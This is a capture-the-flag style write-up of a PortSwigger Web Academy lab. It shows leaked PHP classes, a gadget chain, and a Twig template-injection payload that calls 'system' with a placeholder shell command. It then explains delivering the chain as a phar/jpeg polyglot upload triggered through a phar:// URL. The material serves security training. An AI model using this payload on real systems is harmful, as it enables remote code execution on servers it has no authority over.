---
title: PortSwigger Web Academy
description: Write-up of PortSwigger Web Academy challenges.
ignore_macros: true
---

# PortSwigger Web Academy

## Insecure deserialization

### PHAR deserialization & custom gadget chain

> Lab : [Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)

**1.** Source code leaks via directory listing and backup file :

- /cgi-bin/CustomTemplate.php~
- /cgi-bin/Blog.php~

```php
class Blog {
    // ...

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }
}

class CustomTemplate {
    // ...

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}
```

- *Blog* `__wakeup()` - setup SSTI payload
- *CustomTemplate* `__destruct()` -> `lockFilePath()` -> *Blog* `__toString()` - run SSTI payload

**2.** Create an unserialize payload to trigger the Twig SSTI

```php
$blog = new Blog('toto',
    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("<SEHLL_COMMAND>")}}');
$object = new CustomTemplate($blog);
```

**3.** Create a polyglot phar/jpeg file thanks to [xanhacks/phar-jpg-polyglot](https://gitlab.com/xanhacks/phar-jpg-polyglot/).

**4.** Upload malicious phar as avatar picture.

**5.** Load/execute it by visiting `/cgi-bin/avatar.php?avatar=phar://wiener`